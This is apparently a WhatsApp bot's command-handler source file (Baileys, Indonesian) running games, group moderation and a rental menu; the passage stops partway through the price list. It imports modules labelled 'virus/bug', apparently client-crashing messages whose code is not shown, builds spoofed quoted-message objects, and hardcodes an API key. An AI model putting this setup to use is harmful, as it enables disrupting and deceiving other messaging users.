//ReEdit By GansBOTz

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const hx = require('hxz-api')
const axios = require('axios')
const chalk = require('chalk')
const yts = require('yt-search')
const xfar = require('xfarr-api')
const google = require('google-it')
const maker = require('mumaker')
const naztod = require("tod-api")
const request = require('request');
const textpro = require('./lib/textpro')
const bochil = require('@bochilteam/scraper')
const { tiktokdl, tiktokdlv2 } = require ('@bochilteam/scraper')
const { youtubeSearch } = require ('@bochilteam/scraper')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const lolkey = 'a243d5d9b0d811b81d63e6cf'

//virus/bug
const { philips } = require('./media/function/philips')
const { virus } = require('./media/function/virus')
const { ngazap } = require('./media/function/ngazap')
const virgam = fs.readFileSync(`./media/image/logo.jpg`)

//Tanggal Nya Cuy
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const hariiini = moment.tz('Asia/Jakarta').format('DD MMMM YYYY')
const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')

//Ubah Di Config.js
const nyoutube = (`${titlebot}`)
const foter = (`${titlebot}`)
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'
gambar = fs.readFileSync('./media/image/logo.jpg')

//TIME
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌉'
 } 
 
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = gans = async (gans, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await gans.decodeJid(gans.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
        
 //Group
const groupMetadata = m.isGroup ? await gans.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const from = mek.key.remoteJid

//Slot
const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]
		
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
  }
const klqor = ['😁','🥰','😇','🥲','🙃','🙂','🤑','😑','♻️','🔞','✅','🙏','❤','🔴','❗','〽️','🎶','🤗','👤','🔎','🔋','📚','🎬','🐵','🐒','🐦','🍌','🍎','🥝','🥒','🫓','🍒','🍐','🥦','🌍','🌎','🎃','🎄','🥎','🎖','🏆','🏅','🥇','🥈','🥉','🎗','🎟','🎫','🎁','🎀','👑','💎','⚠️']
const kloadq = klqor[Math.floor(Math.random() * klqor.length)]
const filsj = ['application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','application/vnd.openxmlformats-officedocument.presentationml.presentation','application/vnd.openxmlformats-officedocument.wordprocessingml.document','application/pdf']
const filsk = filsj[Math.floor(Math.random() * filsj.length)]

	try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
    afkTime: -1,
    afkReason: '',
    limit: limitUser,
}
    
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
    mute: false,
    antilink: false,
            }
		
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (!('autobio' in setting)) setting.autobio = false
if (!('templateImage' in setting)) setting.templateImage = true
if (!('templateVideo' in setting)) setting.templateVideo = false
if (!('templateGif' in setting)) setting.templateGif = false
if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
        
        // Public & Self
        if (!gans.public) {
            if (!m.key.fromMe) return
        }
        if (m.message) {
            gans.readMessages([m.key])
        }
        
        if (m.text.includes('🗿')) {
    gans.sendMessage(m.chat, {
          react: {
            text: '🗿',
            key: m.key
          }})
        }
    
//sticker url
const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './database/stick' + names + '.png', async function () {
console.log('selesai');
let filess = './database/stick' + names + '.png'
let asw = './database/stick' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
gans.sendMessage(to, { sticker: media}, {quoted: m})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}

//Resize
const reSize = async(buffer, ukur1, ukur2) => {
return new Promise(async(resolve, reject) => {
let jimp = require('jimp')
var baper = await jimp.read(buffer);
var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
             resolve(ab)
             })
             }
             
//Fake
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2009,status: 200, thumbnail: await reSize(thumb, 100, 100), surface: 200, message: `${ytname}`, orderTitle: titlebot, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `${ytname}`,jpegThumbnail: await reSize(thumb, 100, 100)}}}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const ftextt = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})}, message: { "extendedTextMessage": {"text":`${ytname}`, "title": `${botname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
const ftoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast" } : {})}, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": await reSize(thumb, 100, 100)},"title": `${ytname}`, "description": `${botname}`, "currencyCode": "IDR", "priceAmount1000": "1000000000000000000", "retailerId": `${ytname}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}} 
const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`${ytname}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `${ytname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": `${ytname}`, "caption": `${ytname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":`${ytname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${ytname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${ytname}`,jpegThumbnail: await reSize(thumb, 100, 100)}}}
const floc2 = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) }, message: { "liveLocationMessage": { "title": `${ytname}`,"h": `Hmm`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${ytname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ytname,;;;\nFN:ytname\nitem1.TEL;waid=6285875158363:6285875158363\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await reSize(thumb, 100, 100), thumbnail: await reSize(thumb, 100, 100),sendEphemeral: true}}}
const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": `${ytname}`,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": await reSize(thumb, 100, 100),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
const deploy = (teks) => {
  gans.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}

// reset limit every 12 hours
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})

// total hit
global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/naze-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/naze-md${moment.tz('Asia/Jakarta').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}

// auto set bio
if (db.data.settings[botNumber].autobio) {
let setting = global.db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await gans.setStatus(`${gans.user.name} | Runtime : ${runtime(uptime)}`)
setting.status = new Date() * 1
}
}

// Anti Link
if (db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
m.reply(`「 *ANTI LINK* 」\n\n*Kamu terdeteksi mengirim link group*, *maaf kamu akan di kick‼️,yang mau juga silahkan kirim link‼️*`)
if (!isBotAdmins) return m.reply(`*Bot aja bukan admin anj*`)
let gclink = (`https://chat.whatsapp.com/`+await gans.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`*maaf gak jadi, karena kamu ngirim link group ini*`)
if (isAdmins) return m.reply(`*maaf kamu admin*`)
if (isCreator) return m.reply(`*maaf kamu owner bot ku*`)
gans.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: gans.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, gans.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
gans.ev.emit('messages.upsert', msg)
}

//setting Game
if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
gans.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await gans.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, gans.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await gans.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, gans.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await gans.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, gans.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await gans.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, gans.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await gans.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, gans.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await gans.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, gans.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
	    
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await gans.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, gans.user.name, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await gans.sendText(room.x, str, m, { mentions: parseMention(str) } )
await gans.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

 //Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
gans.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
gans.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) gans.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) gans.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) gans.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
gans.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) gans.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) gans.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    gans.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
switch(command) {
case 'sewabot':
case 'sewa': {
m.reply(mess.wait)
swenya = `┏━━⬣ 𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭 𝐎𝐧𝐞✨
┃💌 : SEWA 5K/BLN
┃💌 : SEWA 10K/2BLN
